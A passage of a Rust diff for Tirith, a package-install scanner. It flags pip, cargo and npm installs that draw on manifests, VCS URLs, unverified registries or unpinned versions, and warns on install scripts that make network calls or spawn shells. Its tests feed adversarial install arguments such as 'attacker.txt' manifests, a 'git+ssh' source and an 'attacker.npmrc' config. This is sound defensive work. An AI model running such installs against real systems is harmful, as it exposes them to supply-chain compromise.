+        if scope.is_empty() || tail.is_empty() {
+            return false;
+        }
+        if let Some(at) = tail.find('@') {
+            (&argument[..slash + 1 + at], Some(&tail[at + 1..]))
+        } else {
+            (argument, None)
+        }
+    } else if let Some(at) = argument.find('@') {
+        (&argument[..at], Some(&argument[at + 1..]))
+    } else {
+        (argument, None)
+    };
+    if name.is_empty() || name.contains('\\') {
+        return false;
+    }
+    let slash_count = name.bytes().filter(|byte| *byte == b'/').count();
+    if (name.starts_with('@') && slash_count != 1)
+        || (!name.starts_with('@') && slash_count != 0)
+        || name.contains(':')
+    {
+        return false;
+    }
+    match spec {
+        None => true,
+        Some("") => true,
+        Some(spec) => {
+            let lower = spec.to_ascii_lowercase();
+            !lower.starts_with("file:")
+                && !lower.starts_with("link:")
+                && !lower.starts_with("workspace:")
+                && !lower.starts_with("npm:")
+                && !is_npm_remote_source(&lower)
+                && !spec.contains('/')
+                && !spec.contains('\\')
+                && !spec.contains(':')
+        }
+    }
+}
+
+fn analyze_pip_coverage(args: &[String], coverage: &mut InstallCoverage) {
+    const MANIFEST_FLAGS: &[&str] = &[
+        "-r",
+        "--requirement",
+        "--requirements",
+        "-c",
+        "--constraint",
+        "-e",
+        "--editable",
+    ];
+    const SOURCE_FLAGS: &[&str] = &[
+        "--index-url",
+        "-i",
+        "--extra-index-url",
+        "--find-links",
+        "-f",
+    ];
+    const VALUE_FLAGS: &[&str] = &[
+        "--target",
+        "-t",
+        "--root",
+        "--prefix",
+        "--src",
+        "--build",
+        "-b",
+        "--config-settings",
+        "--global-option",
+        "--install-option",
+        "--retries",
+        "--timeout",
+        "--exists-action",
+        "--platform",
+        "--python-version",
+        "--implementation",
+        "--abi",
+        "--only-binary",
+        "--no-binary",
+    ];
+    const BOOL_FLAGS: &[&str] = &[
+        "--pre",
+        "--upgrade",
+        "-U",
+        "--force-reinstall",
+        "--ignore-installed",
+        "-I",
+        "--no-deps",
+        "--no-build-isolation",
+        "--use-pep517",
+        "--no-use-pep517",
+        "--compile",
+        "--no-compile",
+        "--user",
+        "--dry-run",
+        "--require-hashes",
+        "--prefer-binary",
+        "--break-system-packages",
+        "--disable-pip-version-check",
+        "--isolated",
+        "--no-cache-dir",
+        "-q",
+        "--quiet",
+        "-v",
+        "--verbose",
+    ];
+
+    let mut index = 0;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            index += 1;
+            continue;
+        }
+        if argument == "--no-index" {
+            registry_gap(
+                coverage,
+                argument,
+                "pip will disable registry resolution, so PyPI provenance cannot describe the installed artifact",
+            );
+            index += 1;
+            continue;
+        }
+        if matches!(
+            argument.as_str(),
+            "--proxy" | "--trusted-host" | "--cert" | "--client-cert"
+        ) {
+            if let Some(value) = args.get(index + 1) {
+                registry_gap(
+                    coverage,
+                    &format!("{argument} {value}"),
+                    "pip transport or certificate overrides prevent Tirith from binding installed bytes to its validated PyPI request",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if ["--proxy=", "--trusted-host=", "--cert=", "--client-cert="]
+            .iter()
+            .any(|prefix| argument.starts_with(prefix))
+        {
+            registry_gap(
+                coverage,
+                argument,
+                "pip transport or certificate overrides prevent Tirith from binding installed bytes to its validated PyPI request",
+            );
+            index += 1;
+            continue;
+        }
+        if MANIFEST_FLAGS.contains(&argument.as_str()) {
+            if let Some(value) = args.get(index + 1) {
+                let kind_remote =
+                    matches!(argument.as_str(), "-e" | "--editable") && is_remote_operand(value);
+                if kind_remote {
+                    remote_source_gap(
+                        coverage,
+                        &format!("{argument} {value}"),
+                        "pip editable mode will build executable content from a remote source",
+                    );
+                } else {
+                    manifest_gap(
+                        coverage,
+                        &format!("{argument} {value}"),
+                        "pip will read requirements, constraints, or build metadata outside per-package scoring",
+                    );
+                }
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if (argument.starts_with("-r") || argument.starts_with("-c") || argument.starts_with("-e"))
+            && argument.len() > 2
+            && !argument.starts_with("--")
+        {
+            manifest_gap(
+                coverage,
+                argument,
+                "pip joined short-form input selects a manifest, constraint, or editable source",
+            );
+            index += 1;
+            continue;
+        }
+        if [
+            "--requirement=",
+            "--requirements=",
+            "--constraint=",
+            "--editable=",
+        ]
+        .iter()
+        .any(|prefix| argument.starts_with(prefix))
+        {
+            manifest_gap(
+                coverage,
+                argument,
+                "pip will read a manifest or editable source outside per-package scoring",
+            );
+            index += 1;
+            continue;
+        }
+        if SOURCE_FLAGS.contains(&argument.as_str()) {
+            if let Some(value) = args.get(index + 1) {
+                let official_primary = matches!(argument.as_str(), "--index-url" | "-i")
+                    && is_official_registry(PackageManager::Pip, value);
+                if !official_primary {
+                    registry_gap(
+                        coverage,
+                        &format!("{argument} {value}"),
+                        "pip source selection is custom or ambiguous and cannot reuse PyPI provenance",
+                    );
+                }
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if let Some((flag, value)) = argument.split_once('=') {
+            if SOURCE_FLAGS.contains(&flag) {
+                let official_primary =
+                    flag == "--index-url" && is_official_registry(PackageManager::Pip, value);
+                if value.is_empty() {
+                    missing_value_gap(coverage, flag);
+                } else if !official_primary {
+                    registry_gap(
+                        coverage,
+                        argument,
+                        "pip source selection is custom or ambiguous and cannot reuse PyPI provenance",
+                    );
+                }
+                index += 1;
+                continue;
+            }
+        }
+        if argument == "--cache-dir" {
+            if let Some(value) = args.get(index + 1) {
+                registry_gap(
+                    coverage,
+                    &format!("--cache-dir {value}"),
+                    "pip may reuse package bytes from an alternate cache outside the source binding",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument.starts_with("--cache-dir=") {
+            registry_gap(
+                coverage,
+                argument,
+                "pip may reuse package bytes from an alternate cache outside the source binding",
+            );
+            index += 1;
+            continue;
+        }
+        if VALUE_FLAGS.contains(&argument.as_str()) {
+            if args.get(index + 1).is_some() {
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if VALUE_FLAGS
+            .iter()
+            .any(|flag| argument.starts_with(&format!("{flag}=")))
+            || BOOL_FLAGS.contains(&argument.as_str())
+        {
+            index += 1;
+            continue;
+        }
+        if argument.starts_with('-') {
+            unknown_flag_gap(coverage, argument, PackageManager::Pip);
+            index += 1;
+            continue;
+        }
+        match classify_pip_positional_operand(argument) {
+            PipPositionalOperand::Registry => {}
+            PipPositionalOperand::LocalOrDirectSource => manifest_gap(
+                coverage,
+                argument,
+                "pip will build executable package content from a local path, archive, or non-registry direct reference",
+            ),
+            PipPositionalOperand::RemoteOrVcsSource => remote_source_gap(
+                coverage,
+                argument,
+                "pip will install executable content from a direct URL or VCS reference",
+            ),
+        }
+        index += 1;
+    }
+}
+
+fn analyze_cargo_coverage(args: &[String], coverage: &mut InstallCoverage) {
+    const SOURCE_FLAGS: &[&str] = &["--registry", "--index"];
+    const REMOTE_FLAGS: &[&str] = &["--git"];
+    const LOCAL_FLAGS: &[&str] = &["--path"];
+    const VALUE_FLAGS: &[&str] = &[
+        "--version",
+        "--vers",
+        "--branch",
+        "--tag",
+        "--rev",
+        "--features",
+        "-F",
+        "--target-dir",
+        "--root",
+        "--jobs",
+        "-j",
+        "--rename",
+        "--profile",
+        "--target",
+        "--color",
+    ];
+    const BOOL_FLAGS: &[&str] = &[
+        "--locked",
+        "--offline",
+        "--frozen",
+        "--force",
+        "--no-track",
+        "--debug",
+        "--all-features",
+        "--no-default-features",
+        "--quiet",
+        "-q",
+        "--verbose",
+        "-v",
+    ];
+
+    let mut index = 0;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            index += 1;
+            continue;
+        }
+        if SOURCE_FLAGS.contains(&argument.as_str()) {
+            if let Some(value) = args.get(index + 1) {
+                let official = (argument == "--registry" && value == "crates-io")
+                    || (argument == "--index"
+                        && is_official_registry(PackageManager::Cargo, value));
+                if !official {
+                    registry_gap(
+                        coverage,
+                        &format!("{argument} {value}"),
+                        "cargo will select a registry/index other than the validated crates.io origin",
+                    );
+                }
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument == "--config" {
+            if let Some(value) = args.get(index + 1) {
+                registry_gap(
+                    coverage,
+                    &format!("--config {value}"),
+                    "cargo CLI configuration can replace crates.io or select another registry",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument.starts_with("--config=") {
+            registry_gap(
+                coverage,
+                argument,
+                "cargo CLI configuration can replace crates.io or select another registry",
+            );
+            index += 1;
+            continue;
+        }
+        if REMOTE_FLAGS.contains(&argument.as_str()) || LOCAL_FLAGS.contains(&argument.as_str()) {
+            if let Some(value) = args.get(index + 1) {
+                if REMOTE_FLAGS.contains(&argument.as_str()) {
+                    remote_source_gap(
+                        coverage,
+                        &format!("{argument} {value}"),
+                        "cargo will build executable content from a VCS source",
+                    );
+                } else {
+                    manifest_gap(
+                        coverage,
+                        &format!("{argument} {value}"),
+                        "cargo will build executable content from a local manifest",
+                    );
+                }
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if let Some((flag, value)) = argument.split_once('=') {
+            if SOURCE_FLAGS.contains(&flag) {
+                let official = (flag == "--registry" && value == "crates-io")
+                    || (flag == "--index" && is_official_registry(PackageManager::Cargo, value));
+                if value.is_empty() {
+                    missing_value_gap(coverage, flag);
+                } else if !official {
+                    registry_gap(
+                        coverage,
+                        argument,
+                        "cargo will select a registry/index other than the validated crates.io origin",
+                    );
+                }
+                index += 1;
+                continue;
+            }
+            if flag == "--git" {
+                remote_source_gap(
+                    coverage,
+                    argument,
+                    "cargo will build executable content from a VCS source",
+                );
+                index += 1;
+                continue;
+            }
+            if flag == "--path" {
+                manifest_gap(
+                    coverage,
+                    argument,
+                    "cargo will build executable content from a local manifest",
+                );
+                index += 1;
+                continue;
+            }
+            if VALUE_FLAGS.contains(&flag) && value.is_empty() {
+                missing_value_gap(coverage, flag);
+                index += 1;
+                continue;
+            }
+        }
+        if VALUE_FLAGS.contains(&argument.as_str()) {
+            if args.get(index + 1).is_some() {
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if VALUE_FLAGS
+            .iter()
+            .any(|flag| argument.starts_with(&format!("{flag}=")))
+            || BOOL_FLAGS.contains(&argument.as_str())
+        {
+            index += 1;
+            continue;
+        }
+        if argument.starts_with('-') {
+            unknown_flag_gap(coverage, argument, PackageManager::Cargo);
+            index += 1;
+            continue;
+        }
+        if is_remote_operand(argument) {
+            remote_source_gap(
+                coverage,
+                argument,
+                "cargo will build executable content from a VCS or URL source",
+            );
+        } else if is_local_operand(argument) {
+            manifest_gap(
+                coverage,
+                argument,
+                "cargo will build executable content from a local path",
+            );
+        }
+        index += 1;
+    }
+}
+
+fn is_official_registry(manager: PackageManager, value: &str) -> bool {
+    let normalized = value.trim().trim_end_matches('/').to_ascii_lowercase();
+    match manager {
+        PackageManager::Npm => normalized == "https://registry.npmjs.org",
+        PackageManager::Pip => normalized == "https://pypi.org/simple",
+        PackageManager::Cargo => matches!(
+            normalized.as_str(),
+            "https://index.crates.io"
+                | "sparse+https://index.crates.io"
+                | "https://github.com/rust-lang/crates.io-index"
+        ),
+        _ => false,
+    }
+}
+
+fn is_remote_operand(argument: &str) -> bool {
+    let lower = argument.to_ascii_lowercase();
+    lower.contains("://")
+        || lower.starts_with("git+")
+        || lower.starts_with("hg+")
+        || lower.starts_with("svn+")
+        || lower.starts_with("bzr+")
+        || lower.starts_with("github:")
+        || lower.starts_with("gitlab:")
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PipPositionalOperand {
+    Registry,
+    LocalOrDirectSource,
+    RemoteOrVcsSource,
+}
+
+fn classify_pip_positional_operand(argument: &str) -> PipPositionalOperand {
+    // pip parses an environment marker before classifying the requirement,
+    // then strips trailing extras before `_get_url_from_path`. Mirror that
+    // classification order so markers/extras cannot hide a local path/archive.
+    let whole = pip_classification_operand(argument);
+    if whole == "@" || is_remote_operand(whole) {
+        return PipPositionalOperand::RemoteOrVcsSource;
+    }
+
+    // A registry distribution name cannot contain `@`. Classify its direct
+    // target once, then use that same target for both remote/VCS and local
+    // decisions. Any remaining `@` form is still non-registry and must fail
+    // closed, including a relative path whose filename itself contains `@`.
+    if let Some((_, target)) = whole.split_once('@') {
+        let direct_target = target.trim();
+        if !direct_target.is_empty() && is_remote_operand(direct_target) {
+            return PipPositionalOperand::RemoteOrVcsSource;
+        }
+        return PipPositionalOperand::LocalOrDirectSource;
+    }
+
+    if whole.to_ascii_lowercase().starts_with("file:") {
+        return PipPositionalOperand::LocalOrDirectSource;
+    }
+    if is_local_operand(whole) {
+        PipPositionalOperand::LocalOrDirectSource
+    } else {
+        PipPositionalOperand::Registry
+    }
+}
+
+fn pip_classification_operand(argument: &str) -> &str {
+    let without_marker = argument
+        .split_once(';')
+        .map_or(argument, |(requirement, _)| requirement)
+        .trim();
+    if let Some(without_close) = without_marker.strip_suffix(']') {
+        if let Some((base, extras)) = without_close.rsplit_once('[') {
+            if !base.trim().is_empty() && !extras.is_empty() {
+                return base.trim_end();
+            }
+        }
+    }
+    without_marker
+}
+
+fn is_local_operand(argument: &str) -> bool {
+    let lower = argument.to_ascii_lowercase();
+    argument == "."
+        || argument == ".."
+        || argument.starts_with("./")
+        || argument.starts_with("../")
+        || argument.starts_with('/')
+        || argument.starts_with('~')
+        || argument.contains('/')
+        || argument.contains('\\')
+        || [
+            ".whl",
+            ".zip",
+            ".tar",
+            ".tar.gz",
+            ".tgz",
+            ".tar.bz2",
+            ".tbz",
+            ".tar.xz",
+            ".txz",
+            ".tlz",
+            ".tar.lz",
+            ".tar.lzma",
+        ]
+        .iter()
+        .any(|suffix| lower.ends_with(suffix))
+}
+
+fn coverage_gap_finding(
+    manager: PackageManager,
+    gap: &InstallCoverageGap,
+    analysis_command: &str,
+    policy: &Policy,
+) -> Finding {
+    let strict = matches!(policy.fail_mode, FailMode::Closed);
+    let severity = if strict
+        || matches!(
+            gap.kind,
+            InstallCoverageGapKind::UnverifiedRegistry | InstallCoverageGapKind::ProvenanceMismatch
+        ) {
+        Severity::High
+    } else {
+        Severity::Medium
+    };
+    let title = match gap.kind {
+        InstallCoverageGapKind::ManifestOrLocalSource => format!(
+            "{} manifest install — executable input was not package-scored",
+            manager.label()
+        ),
+        InstallCoverageGapKind::RemoteOrVcsSource => format!(
+            "{} direct-source install — executable input was not provenance-bound",
+            manager.label()
+        ),
+        InstallCoverageGapKind::UnverifiedRegistry => format!(
+            "{} install selects an unverified registry/source",
+            manager.label()
+        ),
+        InstallCoverageGapKind::UnresolvedVersion => format!(
+            "{} package version is unresolved — registry provenance is unbound",
+            manager.label()
+        ),
+        InstallCoverageGapKind::ProvenanceMismatch => {
+            "Registry provenance did not match the selected package identity".to_string()
+        }
+        InstallCoverageGapKind::InstallScriptUnavailable => {
+            "Install-script policy could not be evaluated".to_string()
+        }
+        _ => format!("{} install analysis is incomplete", manager.label()),
+    };
+    let remediation = if gap.kind == InstallCoverageGapKind::ManifestOrLocalSource {
+        "Run `tirith ecosystem scan` on the referenced manifest or source before installing."
+    } else {
+        "Use a validated official registry and an exact package version, or inspect the referenced artifact before installing."
+    };
+    Finding {
+        rule_id: RuleId::ThreatSuspiciousPackage,
+        severity,
+        title,
+        description: format!(
+            "Tirith could not prove complete coverage for `{analysis_command}`: {}. {} {}",
+            gap.reason,
+            if strict {
+                "Under `fail_mode: closed`, this unverified executable input blocks the install."
+            } else {
+                "The install requires an explicit warning acknowledgement."
+            },
+            remediation,
+        ),
+        evidence: vec![Evidence::Text {
+            detail: format!(
+                "manager={} coverage_gap={:?} argument={}",
+                manager.label(),
+                gap.kind,
+                gap.argument
+            ),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
     }
 }
 
@@ -742,40 +2283,231 @@ fn gather_package_signals(
     request: &PlanRequest,
     eco: Ecosystem,
     pkg: &PackageRef,
+    registry_source_verified: bool,
     notes: &mut Vec<String>,
-) -> PackageSignals {
+) -> (PackageSignals, Option<InstallCoverageGap>) {
     let db = request.db;
     let name_vs_popular = package_risk::classify_name(db, eco, &pkg.name);
     let malicious_typosquat_of = db
         .and_then(|db| db.check_typosquat(eco, &pkg.name))
         .map(|ts| ts.target_name);
 
-    let api = match &request.online {
-        OnlineMode::Off => ApiSignals::offline(),
+    let (api, signal_gap) = match &request.online {
+        OnlineMode::Off
+            if matches!(request.policy.fail_mode, FailMode::Closed) && registry_source_verified =>
+        {
+            let (kind, reason) = if pkg.version.exact_version().is_some() {
+                (
+                    InstallCoverageGapKind::ProvenanceUnavailable,
+                    "strict policy requires exact registry provenance, but online provenance analysis is disabled",
+                )
+            } else {
+                (
+                    InstallCoverageGapKind::UnresolvedVersion,
+                    "strict policy requires a resolved package version and exact registry provenance, but this offline install is not exactly bound",
+                )
+            };
+            notes.push(format!(
+                "registry-API provenance for '{}' was not used: {reason}",
+                pkg.name
+            ));
+            (
+                ApiSignals::offline(),
+                Some(InstallCoverageGap {
+                    kind,
+                    argument: pkg.name.clone(),
+                    reason: reason.to_string(),
+                }),
+            )
+        }
+        OnlineMode::Off => (ApiSignals::offline(), None),
+        OnlineMode::UnverifiedSource(reason) => {
+            let reason = format!(
+                "package-manager source configuration is not bound to the official registry: {reason}"
+            );
+            notes.push(format!(
+                "registry-API provenance for '{}' was not used: {reason}",
+                pkg.name
+            ));
+            (
+                ApiSignals::unavailable(reason.clone()),
+                Some(InstallCoverageGap {
+                    kind: InstallCoverageGapKind::UnverifiedRegistry,
+                    argument: pkg.name.clone(),
+                    reason,
+                }),
+            )
+        }
+        OnlineMode::Resolver(_) if !registry_source_verified => {
+            let reason = "the install selects a local, direct, or unverified source, so official-registry provenance was not attached";
+            notes.push(format!(
+                "registry-API provenance for '{}' was not used: {reason}",
+                pkg.name
+            ));
+            (ApiSignals::unavailable(reason), None)
+        }
+        OnlineMode::Resolver(_) if pkg.version.exact_version().is_none() => {
+            let reason = "the requested version is not an exact pin, so the artifact selected by the package manager is unresolved";
+            notes.push(format!(
+                "registry-API provenance for '{}' was not used: {reason}",
+                pkg.name
+            ));
+            (
+                ApiSignals::unavailable(reason),
+                Some(InstallCoverageGap {
+                    kind: InstallCoverageGapKind::UnresolvedVersion,
+                    argument: pkg.name.clone(),
+                    reason: reason.to_string(),
+                }),
+            )
+        }
         OnlineMode::Resolver(resolve) => {
-            let signals = resolve(eco, &pkg.name);
-            if let ApiSignals::Unavailable { reason } = &signals {
-                notes.push(format!(
-                    "registry-API provenance for '{}' was unavailable: {reason}",
-                    pkg.name
-                ));
+            let exact_version = pkg
+                .version
+                .exact_version()
+                .expect("guarded by the preceding match arm");
+            let registry_name = canonical_registry_name(eco, &pkg.name);
+            let signals = resolve(eco, &registry_name, exact_version);
+            match signals {
+                ApiSignals::Available { provenance }
+                    if provenance_matches_request(
+                        &provenance,
+                        eco,
+                        &registry_name,
+                        exact_version,
+                    ) && matches!(provenance.package_existence, PackageExistence::NotFound) =>
+                {
+                    if matches!(request.policy.fail_mode, FailMode::Closed) {
+                        let reason = format!(
+                            "the official registry reports that exact package '{registry_name}' does not exist, so no install artifact provenance can be established"
+                        );
+                        notes.push(format!(
+                            "registry-API provenance for '{}' was unavailable: {reason}",
+                            pkg.name
+                        ));
+                        (
+                            // Preserve the positive NotFound signal so
+                            // `block_not_found` remains independently visible.
+                            ApiSignals::Available { provenance },
+                            Some(InstallCoverageGap {
+                                kind: InstallCoverageGapKind::ProvenanceUnavailable,
+                                argument: format!("{}@{exact_version}", pkg.name),
+                                reason,
+                            }),
+                        )
+                    } else {
+                        (ApiSignals::Available { provenance }, None)
+                    }
+                }
+                ApiSignals::Available { provenance }
+                    if provenance_matches_request(
+                        &provenance,
+                        eco,
+                        &registry_name,
+                        exact_version,
+                    ) =>
+                {
+                    (ApiSignals::Available { provenance }, None)
+                }
+                ApiSignals::Available { provenance } => {
+                    let reason = format!(
+                        "the registry response identity did not match {}/{registry_name}@{exact_version} (source={}, version={})",
+                        expected_registry_source(eco).unwrap_or("unsupported"),
+                        provenance.source,
+                        provenance.latest_version.as_deref().unwrap_or("unknown"),
+                    );
+                    notes.push(format!(
+                        "registry-API provenance for '{}' was rejected: {reason}",
+                        pkg.name
+                    ));
+                    (
+                        ApiSignals::unavailable(reason.clone()),
+                        Some(InstallCoverageGap {
+                            kind: InstallCoverageGapKind::ProvenanceMismatch,
+                            argument: format!("{}@{exact_version}", pkg.name),
+                            reason,
+                        }),
+                    )
+                }
+                ApiSignals::Unavailable { reason } => {
+                    notes.push(format!(
+                        "registry-API provenance for '{}' was unavailable: {reason}",
+                        pkg.name
+                    ));
+                    (
+                        ApiSignals::Unavailable {
+                            reason: reason.clone(),
+                        },
+                        Some(InstallCoverageGap {
+                            kind: InstallCoverageGapKind::ProvenanceUnavailable,
+                            argument: format!("{}@{exact_version}", pkg.name),
+                            reason,
+                        }),
+                    )
+                }
+                ApiSignals::NotComputed { reason } => {
+                    let reason = format!(
+                        "online provenance resolver did not evaluate the exact artifact: {reason}"
+                    );
+                    notes.push(format!(
+                        "registry-API provenance for '{}' was unavailable: {reason}",
+                        pkg.name
+                    ));
+                    (
+                        ApiSignals::unavailable(reason.clone()),
+                        Some(InstallCoverageGap {
+                            kind: InstallCoverageGapKind::ProvenanceUnavailable,
+                            argument: format!("{}@{exact_version}", pkg.name),
+                            reason,
+                        }),
+                    )
+                }
             }
-            signals
         }
     };
 
-    PackageSignals {
-        ecosystem: eco,
-        name: pkg.name.clone(),
-        // M6 ch6 — carry version through so OSV can pin to (eco, name, version).
-        version: pkg.version.as_version_str().map(str::to_string),
-        threat_db_missing: db.is_none(),
-        name_vs_popular,
-        malicious_typosquat_of,
-        // Pre-install: nothing on disk and we never fetch — content not evaluated.
-        content_signals: ContentSignals::NotInspected,
-        api,
+    (
+        PackageSignals {
+            ecosystem: eco,
+            name: pkg.name.clone(),
+            // M6 ch6 — carry version through so OSV can pin to (eco, name, version).
+            version: pkg.version.as_version_str().map(str::to_string),
+            threat_db_missing: db.is_none(),
+            name_vs_popular,
+            malicious_typosquat_of,
+            // Pre-install: nothing on disk and we never fetch — content not evaluated.
+            content_signals: ContentSignals::NotInspected,
+            api,
+        },
+        signal_gap,
+    )
+}
+
+fn expected_registry_source(ecosystem: Ecosystem) -> Option<&'static str> {
+    match ecosystem {
+        Ecosystem::Npm => Some("npm"),
+        Ecosystem::PyPI => Some("pypi"),
+        Ecosystem::Crates => Some("crates.io"),
+        _ => None,
     }
+}
+
+fn provenance_matches_request(
+    provenance: &ApiProvenance,
+    ecosystem: Ecosystem,
+    canonical_name: &str,
+    exact_version: &str,
+) -> bool {
+    let source_matches = expected_registry_source(ecosystem)
+        .is_some_and(|source| provenance.source.eq_ignore_ascii_case(source));
+    let name_matches = provenance.package_name.as_deref().is_some_and(|name| {
+        canonical_registry_name(ecosystem, name)
+            == canonical_registry_name(ecosystem, canonical_name)
+    });
+    let artifact_matches = provenance.latest_version.as_deref() == Some(exact_version);
+    source_matches
+        && name_matches
+        && (artifact_matches || matches!(provenance.package_existence, PackageExistence::NotFound))
 }
 
 /// Turn a package's [`RiskBreakdown`] into [`Finding`]s, de-duped against
@@ -997,6 +2729,47 @@ fn policy_findings_for(
                     mitre_id: None,
                     custom_rule_id: None,
                 });
+            }
+        }
+
+        // PackageInstallScriptNetworkCall — the shipping M6 ch6 baseline is
+        // an explicit Warn, independent of whether the aggregate score happens
+        // to cross 51. The policy field is default-on and can be disabled only
+        // from a trusted policy scope.
+        if pp.warn_install_script_network_call {
+            if let Some(iss) = prov.install_script_signals.as_ref() {
+                if iss.fires() {
+                    out.push(Finding {
+                        rule_id: RuleId::PackageInstallScriptNetworkCall,
+                        severity: Severity::Medium,
+                        title: format!(
+                            "{eco} package install script performs a network or shell action: '{}'",
+                            pkg.name,
+                        ),
+                        description: format!(
+                            "The exact selected {eco} package '{}' contains an install-time \
+                             script that makes a network call or spawns a shell. The default \
+                             install-script policy requires an explicit warning even when the \
+                             package's aggregate risk score is otherwise below the warning \
+                             threshold.",
+                            pkg.name,
+                        ),
+                        evidence: vec![Evidence::Text {
+                            detail: format!(
+                                "package={} ecosystem={eco} has_network_call={} \
+                                 has_shell_spawn={} matched_patterns={}",
+                                pkg.name,
+                                iss.has_network_call,
+                                iss.has_shell_spawn,
+                                iss.suspicious_patterns.len(),
+                            ),
+                        }],
+                        human_view: None,
+                        agent_view: None,
+                        mitre_id: None,
+                        custom_rule_id: None,
+                    });
+                }
             }
         }
 
@@ -1240,6 +3013,108 @@ mod tests {
     }
 
     #[test]
+    fn pip_pep508_marker_preserves_exact_argv_but_scores_canonical_requirement() {
+        let requirement = r#"requests; python_version >= "3.0""#.to_string();
+        let args = [requirement.clone()];
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Pip,
+            user_args: &args,
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+
+        assert_eq!(plan.argv.args, vec!["install".to_string(), requirement]);
+        assert_eq!(plan.coverage.state, InstallCoverageState::Complete);
+        assert!(plan.coverage.gaps.is_empty());
+        assert_eq!(plan.packages.len(), 1);
+        assert_eq!(plan.packages[0].reference.ecosystem, Ecosystem::PyPI);
+        assert_eq!(plan.packages[0].reference.name, "requests");
+        assert_eq!(
+            plan.packages[0].reference.version,
+            VersionIntent::Unspecified
+        );
+    }
+
+    #[test]
+    fn pip_spaced_and_parenthesized_pins_score_the_canonical_identity() {
+        for requirement in ["requests == 2.31.0", "requests (==2.31.0)"] {
+            let args = [requirement.to_string()];
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Pip,
+                user_args: &args,
+                db: None,
+                policy: &empty_policy(),
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(
+                plan.argv.args,
+                vec!["install".to_string(), requirement.to_string()]
+            );
+            assert_eq!(plan.coverage.state, InstallCoverageState::Complete);
+            assert!(plan.coverage.gaps.is_empty());
+            assert_eq!(plan.packages.len(), 1);
+            assert_eq!(plan.packages[0].reference.name, "requests");
+            assert_eq!(
+                plan.packages[0].reference.version,
+                VersionIntent::Exact("2.31.0".to_string())
+            );
+        }
+    }
+
+    #[test]
+    fn pip_named_vcs_and_at_sign_paths_are_incomplete_without_registry_scoring() {
+        for (requirement, expected_kind) in [
+            (
+                "demo @ git+ssh:host/repo",
+                InstallCoverageGapKind::RemoteOrVcsSource,
+            ),
+            (
+                "demo@git+file:./repo",
+                InstallCoverageGapKind::RemoteOrVcsSource,
+            ),
+            (
+                "nested/evil@pkg",
+                InstallCoverageGapKind::ManifestOrLocalSource,
+            ),
+        ] {
+            let args = [requirement.to_string()];
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Pip,
+                user_args: &args,
+                db: None,
+                policy: &empty_policy(),
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+
+            assert_eq!(
+                plan.argv.args,
+                vec!["install".to_string(), requirement.to_string()]
+            );
+            assert!(plan.packages.is_empty(), "requirement={requirement}");
+            assert_eq!(
+                plan.coverage.state,
+                InstallCoverageState::Incomplete,
+                "requirement={requirement}"
+            );
+            assert!(
+                plan.coverage
+                    .gaps
+                    .iter()
+                    .any(|gap| gap.kind == expected_kind),
+                "requirement={requirement}, gaps={:?}",
+                plan.coverage.gaps
+            );
+        }
+    }
+
+    #[test]
     fn plan_install_pip_dash_r_manifest_bypass_emits_finding() {
         // PR #121 fix-list item 1 regression pin — `pip install -r req.txt` used
         // to fall through to ALLOW; now the manifest path emits a Medium finding
@@ -1427,6 +3302,993 @@ mod tests {
     }
 
     #[test]
+    fn mixed_pip_package_and_manifest_is_never_partially_allowed() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let args = vec![
+            "benign==1.0.0".to_string(),
+            "-r".to_string(),
+            "attacker.txt".to_string(),
+        ];
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Pip,
+            user_args: &args,
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert_eq!(
+            plan.packages.len(),
+            1,
+            "the explicit package is still scored"
+        );
+        assert!(plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument.contains("attacker.txt")
+        }));
+    }
+
+    #[test]
+    fn joined_pip_manifest_and_npm_workspace_are_coverage_gaps() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        for (manager, args) in [
+            (PackageManager::Pip, vec!["-rattacker.txt".to_string()]),
+            (PackageManager::Npm, vec!["--workspaces".to_string()]),
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager,
+                user_args: &args,
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
+            assert_eq!(plan.coverage.state, InstallCoverageState::Incomplete);
+        }
+    }
+
+    #[test]
+    fn alternate_manager_config_inputs_are_unverified_sources() {
+        for (manager, args) in [
+            (
+                PackageManager::Npm,
+                vec![
+                    "demo@1.0.0".to_string(),
+                    "--userconfig".to_string(),
+                    "attacker.npmrc".to_string(),
+                ],
+            ),
+            (
